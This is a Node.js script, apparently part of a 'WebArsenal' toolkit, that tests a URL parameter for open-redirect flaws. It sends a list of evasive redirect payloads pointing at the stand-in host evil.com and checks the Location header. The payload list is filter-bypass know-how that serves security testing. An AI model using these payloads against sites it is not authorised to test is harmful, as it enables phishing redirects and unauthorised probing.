#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: open-redirect-v2.js                                 ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const axios = require('axios');

program
  .name('open-redirect-v2.js')
  .description('Advanced open redirect tester with recursive redirect tracking and evasive payloads.')
  .version('3.0.0')
  .requiredOption('-u, --url <url>', 'Target URL with parameter (e.g. https://example.com/login?next=/)')
  .option('-p, --param <name>', 'Parameter to test')
  .parse(process.argv);

const opts = program.opts();

const EVASIVE_PAYLOADS = [
  "https://evil.com",
  "//evil.com",
  "\\\\evil.com",
  "/%0ahttps://evil.com",
  "/%2f%2fevil.com",
  "https:evil.com",
  "//%0d%0aevil.com"
];

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'open-redirect-v2.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const targetUrl = new URL(opts.url);
  const param = opts.param || Array.from(targetUrl.searchParams.keys())[0];
  
  if (!param) {
    console.log(chalk.yellow('[!] No parameter found or provided. Use -u <url?next=/>'));
    return;
  }
  
  console.log(chalk.cyan(`[*] Testing Advanced Open Redirect for parameter: ${param}\n`));
  
  for (const payload of EVASIVE_PAYLOADS) {
    const testUrl = new URL(targetUrl.href);
    testUrl.searchParams.set(param, payload);
    
    process.stdout.write(chalk.gray(`[*] Payload: ${payload}... `));
    
    try {
      const res = await axios.get(testUrl.href, { 
        maxRedirects: 0, 
        timeout: 10000, 
        validateStatus: (status) => status >= 300 && status < 400 
      });
      
      const location = res.headers['location'] || '';
      if (location.includes('evil.com')) {
        console.log(chalk.bold.red(`VULNERABLE (Redirect to evil.com detected!)`));
        console.log(chalk.red(`    Location Header: ${location}`));
      } else {
        console.log(chalk.green(`SAFE (Redirected elsewhere)`));
      }
    } catch (e) {
       if (e.response && e.response.status >= 300 && e.response.status < 400) {
         const loc = e.response.headers.location;
         if (loc.includes('evil.com')) {
           console.log(chalk.bold.red(`VULNERABLE (Redirect to evil.com detected!)`));
           console.log(chalk.red(`    Location Header: ${loc}`));
           continue;
         }
       }
       console.log(chalk.red(`NOT REDIRECTED / ERROR`));
    }
  }
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
